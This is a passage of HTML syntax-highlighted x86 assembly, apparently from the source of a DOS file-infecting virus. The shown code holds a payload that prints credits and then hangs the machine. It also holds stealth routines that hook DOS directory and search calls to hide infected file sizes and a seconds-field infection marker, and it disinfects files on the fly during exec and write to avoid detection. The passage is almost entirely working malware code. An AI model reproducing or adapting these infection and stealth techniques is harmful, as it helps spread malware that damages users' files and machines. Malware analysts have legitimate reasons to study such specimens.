                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">txt_credits_1</span><span class="sc0">   
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">loop_beep_string</span><span class="sc0">

                </span><span class="sc1">;Set cursor position</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc8">bh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0C16h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">

                </span><span class="sc1">;Print string + beep</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">txt_credits_2</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">loop_beep_string</span><span class="sc0">
</span><span class="sc5">hang_machine</span><span class="sc4">:</span><span class="sc0">        
                </span><span class="sc1">;Endless loops rulez :P</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">hang_machine</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Directory stealth with functions 11h and 12h (fcb)                        ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">ff_fcb</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Call dos function</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos_call</span><span class="sc0">

                </span><span class="sc1">;Save all regs</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">push_all</span><span class="sc0">

                </span><span class="sc1">;Check for errors</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">nofound_fcb</span><span class="sc0">

                </span><span class="sc1">;Get current PSP</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">62h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos_call</span><span class="sc0">

                </span><span class="sc1">;Check if call comes from DOS</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">nofound_fcb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">00h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc1">;Get DTA</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2Fh</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos_call</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">fcb_ok</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc0">
</span><span class="sc5">fcb_ok</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Check if infected</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1Fh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1Fh</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">nofound_fcb</span><span class="sc0">

                </span><span class="sc1">;Restore seconds</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">],</span><span class="sc2">0E0h</span><span class="sc0">

                </span><span class="sc1">;Restore original file size</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1Dh</span><span class="sc4">],</span><span class="sc5">inf_byte_size</span><span class="sc0">
                </span><span class="sc6">sbb</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1Fh</span><span class="sc4">],</span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">nofound_fcb</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Restore some registers and return</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">unhook_ints</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">
                </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Search stealth with functions 4Eh and 4Fh (handle)                        ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">ff_handle</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Call dos function</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos_call</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">ffhok</span><span class="sc0">

                </span><span class="sc1">;Exit if error, return flags to caller</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">unhook_ints</span><span class="sc0">
                </span><span class="sc6">stc</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
</span><span class="sc5">ffhok</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Save result</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">push_all</span><span class="sc0">

                </span><span class="sc1">;Get DTA</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2Fh</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos_call</span><span class="sc0">

                </span><span class="sc1">;Check if infected</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1Fh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1Fh</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">nofound_handle</span><span class="sc0">

                </span><span class="sc1">;Restore seconds field</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc2">0E0h</span><span class="sc0">

                </span><span class="sc1">;Restore original size</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1Ah</span><span class="sc4">],</span><span class="sc5">inf_byte_size</span><span class="sc0">
                </span><span class="sc6">sbb</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1Ch</span><span class="sc4">],</span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">nofound_handle</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Restore some registers and exit</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">unhook_ints</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">
                </span><span class="sc6">clc</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Exec ( load program )                                                     ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">dos_load_exec</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Open file for read-only</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D00h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos_call</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">loaded</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">m21h_exit</span><span class="sc0">
</span><span class="sc5">loaded</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">do_disinfect</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Write to file                                                             ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">dos_write</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">push_all</span><span class="sc0">
</span><span class="sc5">do_disinfect</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Get sft address in es:di</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_sft</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">bad_operation</span><span class="sc0">

                </span><span class="sc1">;Check if file is infected</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">0Dh</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1Fh</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">clear_header</span><span class="sc0">
</span><span class="sc5">bad_operation</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">load_error</span><span class="sc0">
</span><span class="sc5">clear_header</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Save and set file open mode (read/write)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0002h</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

                </span><span class="sc1">;Save and set file attribute</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc1">;Save and set file pointer position</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;Get file true size if write operation</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">dos_function</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc4">],(</span><span class="sc2">40h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">no_size_fix</span><span class="sc0">

                </span><span class="sc1">;Add virus size to file size</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">],</span><span class="sc5">inf_byte_size</span><span class="sc0">
                </span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">13h</span><span class="sc4">],</span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">no_size_fix</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Point to old header in file</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seek_end</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">],</span><span class="sc5">file_header_size</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">sbb</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">],</span><span class="sc2">0000h</span><span class="sc0">

                </span><span class="sc1">;Read old header and encryption key</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">file_header_size</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">old_header</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos_call</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">exit_disin</span><span class="sc0">

                </span><span class="sc1">;Decrypt header</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">decrypt_header</span><span class="sc0">

                </span><span class="sc1">;Write old header</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seek_begin</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">old_header</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">file_header_size</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos_call</span><span class="sc0">

                </span><span class="sc1">;Truncate file</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seek_end</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">],</span><span class="sc5">inf_byte_size</span><span class="sc0">
                </span><span class="sc6">sbb</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">],</span><span class="sc2">0000h</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos_call</span><span class="sc0">
</span><span class="sc5">exit_disin</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Restore file pointer position</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;Restore file attribute</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

                </span><span class="sc1">;Restore file open mode</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;Do not set file date and file time on closing</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">],</span><span class="sc2">40h</span><span class="sc0">

                </span><span class="sc1">;Clear seconds field</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">0Dh</span><span class="sc4">],</span><span class="sc2">0E0h</span><span class="sc0">
</span><span class="sc5">load_error</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Check if write function</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">dos_function</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc4">],(</span><span class="sc2">40h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">not_load</span><span class="sc0">

                </span><span class="sc1">;Close file</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos_call</span><span class="sc0">
</span><span class="sc5">not_load</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">m21h_exit</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Get file date/time                                                        ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">dos_get_time</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Call function</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos_call</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">ok_get_time</span><span class="sc0">

                </span><span class="sc1">;Exit if error</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">unhook_ints</span><span class="sc0">
                </span><span class="sc6">stc</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
</span><span class="sc5">ok_get_time</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Save result</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">push_all</span><span class="sc0">

                </span><span class="sc1">;Check if file is already infected</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1Fh</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">no_get_time</span><span class="sc0">

                </span><span class="sc1">;Get function result</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">

                </span><span class="sc1">;Clear infection marker</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0E0h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">exit_get_time</span><span class="sc0">
